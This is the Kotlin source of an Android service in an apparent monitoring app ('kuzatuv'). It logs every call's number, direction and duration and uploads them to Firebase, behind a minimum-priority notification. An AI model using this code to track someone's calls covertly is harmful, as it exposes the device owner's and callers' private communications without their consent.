package com.kuzatuv.app

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat

class CallWatcherService : Service() {

    private lateinit var telephonyManager: TelephonyManager
    private var lastNumber: String = "Номаълум"
    private var callStartTime: Long = 0L
    private var wasRinging = false
    private var wasOffHook = false

    private val listener = object : PhoneStateListener() {
        override fun onCallStateChanged(state: Int, phoneNumber: String?) {
            val now = System.currentTimeMillis()
            if (!phoneNumber.isNullOrEmpty()) lastNumber = phoneNumber

            when (state) {
                TelephonyManager.CALL_STATE_RINGING -> {
                    wasRinging = true
                    callStartTime = now
                }
                TelephonyManager.CALL_STATE_OFFHOOK -> {
                    wasOffHook = true
                    if (callStartTime == 0L) callStartTime = now
                }
                TelephonyManager.CALL_STATE_IDLE -> {
                    val durationSec = if (callStartTime > 0) (now - callStartTime) / 1000 else 0
                    val type = when {
                        wasOffHook -> if (wasRinging) "incoming" else "outgoing"
                        wasRinging -> "missed"
                        else -> null
                    }
                    if (type != null) {
                        val device = DevicePrefs.getDeviceName(applicationContext)
                        FirebaseHelper.pushCall(lastNumber, type, callStartTime, durationSec, device)
                    }
                    wasRinging = false
                    wasOffHook = false
                    callStartTime = 0L
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        startForegroundWithNotification()
        @Suppress("DEPRECATION")
        telephonyManager.listen(listener, PhoneStateListener.LISTEN_CALL_STATE)
    }

    private fun startForegroundWithNotification() {
        val channelId = "kuzatuv_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId, "Kuzatuv xizmati", NotificationManager.IMPORTANCE_MIN
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Kuzatuv ishlayapti")
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(1, notification)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        @Suppress("DEPRECATION")
        telephonyManager.listen(listener, PhoneStateListener.LISTEN_NONE)
        super.onDestroy()
    }
}
